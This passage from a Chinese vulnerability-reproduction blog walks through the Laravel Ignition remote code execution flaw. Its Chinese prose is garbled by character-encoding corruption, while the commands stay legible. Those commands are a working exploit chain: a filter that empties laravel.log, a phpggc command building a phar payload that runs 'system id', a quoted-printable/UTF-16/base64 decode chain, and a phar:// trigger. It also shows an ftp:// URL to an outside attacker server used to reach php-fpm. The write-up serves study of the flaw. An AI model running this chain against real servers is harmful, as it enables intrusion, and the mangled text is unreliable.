æ–‡ä»¶</strong></p><p>ä½œè€…æåˆ°æœ‰ä¸€ä¸ªè¿‡æ»¤å™¨ï¼ˆå¹¶æœªè¢«å®˜æ–¹æ–‡æ¡£è®°å½•ï¼‰å¯ä»¥å®Œå…¨æ¸…é™¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=consumed/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure><h5 id="å¤„ç†å•ä¸ªé”™è¯¯"><a href="#å¤„ç†å•ä¸ªé”™è¯¯" class="headerlink" title="å¤„ç†å•ä¸ªé”™è¯¯"></a>å¤„ç†å•ä¸ªé”™è¯¯</h5><p>è™½ç„¶å•ç‹¬çš„ b64 ä¸èƒ½æ¸…é™¤ <code>[x1]~[x3]</code> ï¼Œä½†æˆ‘ä»¬ä¸åªæœ‰è¿™ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå†µä¸” <code>php://filter</code> æ˜¯å…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨çš„ã€‚</p><p>å¤„ç†å•ä¸ªé”™è¯¯çš„æ€è·¯ï¼Œä¾¿æ˜¯æŠŠ <code>[xn]</code> è¿™éƒ¨åˆ†å†…å®¹å°½å¯èƒ½å˜æˆé b64 åˆæ³•å­—ç¬¦ï¼Œæœ€åä¸€æ¬¡æ€§ b64 è§£ç åƒæ‰ï¼Œå°±å‰©ä¸‹äº†æˆ‘ä»¬çš„ payload ï¼Œphar æ–‡ä»¶ã€‚</p><p><a href="https://www.php.net/manual/zh/filters.php">å¯ç”¨è¿‡æ»¤å™¨åˆ—è¡¨</a></p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é€‰æ‹©æ–¹ä¾¿æ„é€ çš„è¿‡æ»¤å™¨ï¼Œ<a href="https://www.php.net/manual/en/filters.convert.php">ä¾‹å¦‚ utf-16 è½¬æ¢ä¸º utf-8</a> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    stream_filter_append(<span class="variable">$fp</span>, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">    <span class="comment">/* Outputs: This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]p\0a\0y\0l\0o\0a\0d\0[x2]p\0a\0y\0l\0o\0a\0d\0[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">ç¡›å´±payloadç¡›å´²payloadç¡›å´³</span><br></pre></td></tr></table></figure><p>è¿™æ · <code>[xn]</code> çš„éƒ¨åˆ†å°±éƒ½å˜æˆäº†é ascii å­—ç¬¦ï¼Œæ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•<strong>è®©ä¸¤å¤„å®Œæ•´ payload åªå‡ºç°ä¸€æ¬¡</strong>ã€‚</p><p>å› ä¸º utf-16 ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åé¢åŠ ä¸€å­—èŠ‚ï¼Œä»è€Œä½¿ç¬¬äºŒå¤„è§£ç é”™è¯¯ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]p\0a\0y\0l\0o\0a\0d\0X[x2]p\0a\0y\0l\0o\0a\0d\0X[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">ç¡›å´±payloadå­˜ã‰¸çæ„€ç¤€æ°€æ¼€æ„€æ€å €ç¡›å´³</span><br></pre></td></tr></table></figure><p>è¿™æ ·åšè¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå› ä¸ºæˆ‘ä»¬çš„ payload ä¸ä¸€å®šåƒç¤ºä¾‹ä¸€æ ·å¥‡æ•°ä¸ªèƒ½å¯¹é½ï¼Œæˆ–è®¸æ˜¯å¦‚ snovving è¿™æ ·çš„å¶æ•°ä¸ªå­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]s\0n\0o\0v\0v\0i\0n\0g[x2]s\0n\0o\0v\0v\0i\0n\0g[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">ç¡›å´±snovvinå­§ã‰¸çæ¸€æ¼€ç˜€ç˜€æ¤€æ¸€æœ€ç¡›å´³</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€åçš„ g æ²¡æœ‰è§£ç æˆåŠŸï¼Œä½†æˆ‘ä»¬åŠ ä¸Šä¸€å­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]s\0n\0o\0v\0v\0i\0n\0g\0X[x2]s\0n\0o\0v\0v\0i\0n\0g\0X[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">ç¡›å´±snovvingå­˜ã‰¸çæ¸€æ¼€ç˜€ç˜€æ¤€æ¸€æœ€å €ç¡›å´³</span><br></pre></td></tr></table></figure><p>å°±èƒ½<strong>ä¿è¯æœ‰ä¸€å¤„è§£ç æ˜¯å®Œå…¨æ­£ç¡®çš„</strong>ã€‚</p><p>ä¸Šè¿°éƒ½æ˜¯å»ºç«‹åœ¨æ—¥å¿—æ–‡ä»¶æœ¬èº«æ˜¯ä¸¤ä¸ªå­—èŠ‚å¯¹é½çš„å‰æä¸‹ï¼Œä½†å¦‚æœä¸æ˜¯çš„è¯ï¼Œæˆ‘ä»¬ä»ä¼šåœ¨ <code>[x1]~[x3]</code> è§£ç é”™è¯¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  file_get_contents(): iconv stream filter (&quot;utf16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence in php shell code on line 1</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¾—æƒ³åŠæ³•è®©è¿™ä¸ªæ–‡ä»¶ <code>[x1]~[x3]</code> çš„éƒ¨åˆ†å°½é‡â€œå‡åŒ€â€ï¼Œèƒ½æ— é™æ¥è¿‘â€œæ•´é™¤â€ï¼Œè¿™æ ·æƒ³å°±å¾ˆæ˜ç¡®äº†ï¼Œä¸¤å€ã€‚</p><p>æˆ‘ä»¬åœ¨å‘é€æ”»å‡» payload ä¹‹å‰ï¼Œå…ˆéšä¾¿å‘é€ä¸€ä¸ªæ— å®³çš„ï¼Œå±Šæ—¶æ—¥å¿—æ–‡ä»¶å°±æ˜¯è¿™æ ·çš„æ„é€ ï¼Œä¿è¯äº†ä¸¤å­—èŠ‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x1_1]payload1[x1_2]payload1[x1_3]</span><br><span class="line">[x2_1]payload2[x2_2]payload2[x2_3]</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œä¾¿æ˜¯å¯¹ç©ºå­—èŠ‚çš„å¤„ç†ï¼Œå®ƒåªæœ‰ä¸€å­—èŠ‚ï¼Œè€Œ <code>file_get_contents()</code> åœ¨åŠ è½½æœ‰ç©ºå­—èŠ‚çš„æ–‡ä»¶æ—¶ä¼š warning ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  file_get_contents() expects parameter 1 to be a valid path, string given in php shell code on line 1</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬è¦å¯¹å®ƒ<strong>è¿›è¡Œå¡«å……ç¼–ç </strong>ï¼Œç›¸ä¿¡æœ‰è¿‡ä¸€å®šè®¡ç½‘çŸ¥è¯†çš„ä¼šè”æƒ³åˆ° quoted-printable è¿™ç§å†…å®¹ä¼ é€ç¼–ç ã€‚</p><blockquote><p>quoted-printable</p><p>è¿™ç§ç¼–ç æ–¹æ³•çš„è¦ç‚¹å°±æ˜¯å¯¹äºæ‰€æœ‰å¯æ‰“å°å­—ç¬¦çš„ ascii ç ï¼Œé™¤ç‰¹æ®Šå­—ç¬¦ç­‰å· = å¤–ï¼Œéƒ½ä¸æ”¹å˜ã€‚</p><p>= å’Œä¸å¯æ‰“å°çš„ ascii ç ä»¥åŠé ascii ç çš„æ•°æ®çš„ç¼–ç æ–¹æ³•æ˜¯ï¼š</p><p>å…ˆå°†æ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶ä»£ç ç”¨ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºï¼Œç„¶ååœ¨å‰é¢å†åŠ ä¸Šä¸€ä¸ªç­‰å· = ã€‚</p><p>ä¸¾ä¾‹å¦‚ = ï¼Œå®ƒçš„ç¼–ç ä¾¿æ˜¯ <code>=3D</code> ï¼Œ3D å¯å¯¹ç…§åå…­è¿›åˆ¶ ascii ç è¡¨å¾—åˆ°ã€‚</p></blockquote><p>åœ¨æ¸…ç©ºäº† log æ–‡ä»¶ã€ä¼ é€ä¸¤ä¸ª payload åï¼Œæ–‡ä»¶ä¸­åªæœ‰ä¸¤ä¸ªé”™è¯¯ä¿¡æ¯è®°å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰å°‘é‡çš„é ascii ç ï¼Œç”¨è¿™ç§ç¼–ç æ–¹å¼å†é€‚åˆä¸è¿‡ï¼Œå¹¶ä¸”ï¼Œå®ƒä¹Ÿæœ‰å¯¹åº”çš„è¿‡æ»¤å™¨ <code>convert.quoted-printable-decode</code> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    stream_filter_append(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* Outputs:  =This is a test.=0A  */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç©ºå­—èŠ‚çš„ç¼–ç ï¼Œè‡ªç„¶æ˜¯ <code>=00</code> ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„è½¬æ¢é“¾å°±èƒ½æ„é€ äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log</span><br></pre></td></tr></table></figure></li></ol><p>ç»¼ä¸Šï¼Œä¸¤ä¸ªé—®é¢˜çš„æå‡ºå’Œè§£å†³ï¼Œæ”»å‡»æ€è·¯å·²ç»éå¸¸æ˜æ™°äº†ï¼š</p><ol><li><p>ç¼–ç æ„é€  payload</p><p>b64 -&gt; quoted-printable ï¼Œè¿™é‡Œæ„é€ å¥½åï¼Œè¿˜è¦åœ¨æœ«å°¾æ·»åŠ ä¸€å­—ç¬¦ï¼Œç¡®ä¿æœ‰ä¸”åªæœ‰ä¸€å¤„æ˜¯å®Œæ•´çš„ payload ã€‚</p></li><li><p>æ¸…ç©º log æ–‡ä»¶</p></li><li><p>å‘é€æ— å®³ payload å¯¹é½</p></li><li><p>å‘é€æ”»å‡» payload</p></li><li><p>è§£ç è½¬æ¢ log è‡³ phar</p><p>quoted-printable -&gt; utf-16 è½¬ utf-8 -&gt; b64</p></li><li><p>phar ä¼ªåè®®æ‰§è¡Œ</p></li></ol><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ç¼–ç æ„é€ ï¼Œéœ€è¦åœ¨ phpggc ç›®å½•ä¸­è¿è¡Œï¼Œç»“æœä¿å­˜åœ¨ <code>payload.txt</code> ä¸­ï¼Œè®°å¾—åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚ <code>a</code> ï¼Œè¿™é‡Œæˆ‘å¹¶æœªç”¨ä½œè€…åšå®¢ä¸­çš„ç”ŸæˆæŒ‡ä»¤ï¼Œä¸¤ä¸ª sed è¡¨è¾¾å¼å¹¶ä¸èƒ½ç™¾åˆ†ç™¾æ­£ç¡® quoted-printable ç¼–ç ï¼Œæˆ‘å‚è€ƒäº†ä½œè€…å†™çš„ exp è„šæœ¬ï¼Œquoted-printable æœ¬è´¨ä¸Šå°±æ˜¯å°†æ¯ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶æ•°å‰åŠ ä¸€ä¸ª <code>=</code> ï¼Œæ‰€ä»¥èƒ½å¾—å‡ºæŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot; &gt; payload.txt</span><br></pre></td></tr></table></figure><p>æ¸…ç©º log æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=consumed/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171400644.png" alt="image-20210212171400644" style="zoom:80%;" /><p>å‘é€æ— å®³ payload ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171447028.png" alt="image-20210212171447028" style="zoom:80%;" /><p>å°†ç¬¬ä¸€æ­¥æ„é€ å¥½çš„ payload å‘é€ï¼ˆæ³¨æ„æœ«å°¾çš„ <code>a</code> æ˜¯æˆ‘ä»¬å‰é¢æ·»åŠ çš„ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41...=00=43=00=54=00=55=00=49=00=3D=00a</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171611206.png" alt="image-20210212171611206" style="zoom:80%;" /><p>è½¬æ¢æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171713560.png" alt="image-20210212171713560" style="zoom:80%;" /><p>æ³¨æ„è½¬æ¢æ–‡ä»¶è¿™æ­¥ä¸€å®šè¦æ— è¿”å›ä¿¡æ¯ï¼Œå¦‚æœæœ‰é”™è¯¯ï¼Œè¯´æ˜å‰å‡ æ­¥æ ¹æœ¬æ²¡åˆ°ä½ã€‚</p><p>æ­¤æ—¶çš„ log æ–‡ä»¶ä¸€å®šåªæœ‰ä¸€æ¡å®Œæ•´çš„ payload ï¼Œä¹Ÿå°±æ˜¯çº¯å‡€çš„ phar æ–‡ä»¶ï¼š</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212171845633.png" alt="image-20210212171845633"></p><p>ä¼ªåè®®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://../storage/logs/laravel.log/test.txt</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210212172002140.png" alt="image-20210212172002140" style="zoom:80%;" /><p>åˆ©ç”¨æˆåŠŸã€‚</p><p>æˆ‘ä»¬å®‰è£…çš„ docker ç¯å¢ƒè‡ªå¸¦æœ‰ exp è„šæœ¬ï¼Œgithub ä¸Šä¹Ÿæœ‰å¾ˆå¤šå¦‚ä¸€é”® getshell çš„ä¼˜ç§€è„šæœ¬ï¼Œå»ºè®®é˜…è¯»å®è·µï¼Œå¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/qq_41832837/article/details/113410247?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242">è¿™ä¸ªåšå®¢</a>å°è¯•è¿è¡Œï¼Œä¹Ÿå¯ä»¥è¯•ç€è‡ªå†™è„šæœ¬æ·»åŠ æ›´å¤šé“¾ç”Ÿæˆçš„ payload ï¼Œå¢å¼ºé€šæ€èƒ½åŠ›ã€‚</p><h3 id="æ¼æ´æ‹“å±•"><a href="#æ¼æ´æ‹“å±•" class="headerlink" title="æ¼æ´æ‹“å±•"></a>æ¼æ´æ‹“å±•</h3><p>è®©æˆ‘æ›´æ„Ÿå…´è¶£çš„æ˜¯ä½œè€…æå‡ºçš„å¦ä¸€ä¸ªæ€è·¯ï¼šä½¿ç”¨ ftp åŒ php-fpm å¯¹è¯ã€‚</p><p>ç»è¿‡ä¸Šé¢çš„æ¼æ´åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>file_put_contents()</code> å†™å…¥ä»»æ„æ•°æ®è‡³ log æ–‡ä»¶ï¼Œç„¶åç» <code>file_get_contents()</code> è¯»å›ï¼Œä½œè€…åˆ©ç”¨è¿™å‘ç›®æ ‡å‘å‡º http è¯·æ±‚æ‰«æäº†é€šç”¨ç«¯å£ï¼Œå¹¶å‘ç° php-fpm åœ¨ç›‘å¬ç«¯å£ 9000 ã€‚</p><blockquote><p>php-fpm</p><p>php-fastcgi è¿›ç¨‹ç®¡ç†å™¨ï¼Œç”¨äºç®¡ç† php è¿›ç¨‹æ± çš„è½¯ä»¶ï¼Œç”¨äºæ¥å— web æœåŠ¡å™¨çš„è¯·æ±‚ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªä¸»è¿›ç¨‹ï¼Œæ§åˆ¶ä½•æ—¶ä»¥åŠå¦‚ä½•å°†http è¯·æ±‚è½¬å‘ç»™ä¸€ä¸ªæˆ–å¤šä¸ªå­è¿›ç¨‹å¤„ç†ã€‚</p><p>php-fpm ä¸»è¿›ç¨‹è¿˜æ§åˆ¶ç€ä»€ä¹ˆæ—¶å€™åˆ›å»ºï¼ˆå¤„ç†Webåº”ç”¨æ›´å¤šçš„æµé‡ï¼‰å’Œé”€æ¯ï¼ˆå­è¿›ç¨‹è¿è¡Œæ—¶é—´å¤ªä¹…æˆ–ä¸å†éœ€è¦äº†ï¼‰PHPå­è¿›ç¨‹ã€‚</p><p>php-fastcgi åªæ˜¯ä¸€ä¸ª cgi ç¨‹åºï¼Œåªä¼šè§£æ php è¯·æ±‚ï¼Œå¹¶ä¸”è¿”å›ç»“æœï¼Œä¸ä¼šç®¡ç† ï¼ˆå› æ­¤æ‰å‡ºç°çš„ php-fpmï¼‰ã€‚</p></blockquote><p>ç»¼ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå¯ä»¥å‘ php-fpm æœåŠ¡å‘é€ä»»æ„äºŒè¿›åˆ¶æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨æœºå™¨ä¸Šæ‰§è¡Œä»£ç ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ä¸ <code>gopher://</code> åè®®é…åˆä½¿ç”¨ï¼Œåè€…ç”± curl æ”¯æŒï¼Œä½† php ä¸æ”¯æŒã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¦ä¸€ä¸ªèƒ½è®©æˆ‘ä»¬å‘é€äºŒè¿›åˆ¶æ•°æ®åŒ…çš„åè®®ï¼Œé‚£å°±æ˜¯è¢«åŠ¨æ¨¡å¼ä¸‹çš„ ftp ï¼Œå®ƒå¯ä»¥é€šè¿‡ tcp è¿æ¥å‘é€ã€‚å¦‚æœå®¢æˆ·æœºæƒ³ä» ftp æœåŠ¡å™¨ä¸Šè¯»å– / å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œftp æœåŠ¡å™¨ä¼šå‘Šè¯‰å®¢æˆ·æœºä»æŸä¸ªç‰¹å®š IP å’Œç«¯å£è¿›è¡Œæ–‡ä»¶æ“ä½œï¼ŒIP å’Œç«¯å£å¹¶æ— é™åˆ¶ï¼Œä¾‹å¦‚æœåŠ¡å™¨è‡ªå·±çš„ç«¯å£ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨ ftp åŒ php-fpm å¯¹è¯è¿›è¡Œæ¼æ´åˆ©ç”¨å‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://evil-server.lexfo.fr/file.txt</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨ ftp åè®®çš„è¢«åŠ¨æ¨¡å¼è®© <code>file_get_contents()</code> åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“å®ƒå°è¯•ä½¿ç”¨ <code>file_put_contents()</code> ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬è®©å®ƒå°†æ–‡ä»¶å‘é€åˆ° 127.0.0.1:9000 ï¼Œä¹Ÿå°±æ˜¯ php-fpm ã€‚</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/6.png" alt="6"></p><p>å›¾æºè‡ªåŸä½œè€…åšå®¢ã€‚</p><p>è¿™æ ·å°±èƒ½å‘é€ä»»æ„äºŒè¿›åˆ¶æ•°æ®åŒ…ï¼ŒRCE ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€»ç»“ä¸€ä¸‹çŸ¥è¯†ç‚¹ï¼š</p><ul><li><p>phar ååºåˆ—åŒ– RCE</p><p>å¦‚æœæœ‰ä¸äº†è§£å¯ä»¥å‚ç…§è¿™ç¯‡æ–‡ç« ï¼Œéå¸¸ç²¾ç®€æ˜“æ‡‚ï¼š</p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p></li><li><p>php://filter å¤šä¸ªè¿‡æ»¤å™¨é…åˆå¦™ç”¨</p><p>è¿™ä¸ªçŸ¥è¯†ç‚¹å¢™è£‚æ¨èé˜…è¯» p ç¥çš„è¿™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>åŒæ—¶è¿™ä¸ªåŸä½œè€…ä¹Ÿæåˆ°è¿‡ orange å¤§ç¥å‡ºçš„ hitcon ctf 2018 One Line PHP Challenge è¿™é“é¢˜ï¼Œä¹Ÿç”¨äº†è¿‡æ»¤å™¨ï¼Œå¯ä»¥é˜…è¯»ä¸€ä¸‹ wp å­¦ä¹ ã€‚</p></li><li><p>ä½¿ç”¨ ftp åŒ php-fpm å¯¹è¯</p><p>è¿™ä¸ªå¯ä»¥å‚è€ƒ hxp-2020 çš„ resonator è¿™é“é¢˜ã€‚</p></li></ul><p>æ„Ÿè°¢ä½ èƒ½é˜…è¯»åˆ°è¿™ï¼Œå¸Œæœ›æˆ‘å†™å¾—è¶³å¤Ÿæ¸…æ™°ï¼Œèƒ½å¸®åŠ©åˆ°ä½ ç†è§£è¿™ä¸ªæ¼æ´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
          <category> PHPä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Laravel </tag>
            
            <tag> è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ </tag>
            
            <tag> Ignition </tag>
            
            <tag> pharååºåˆ—åŒ– </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
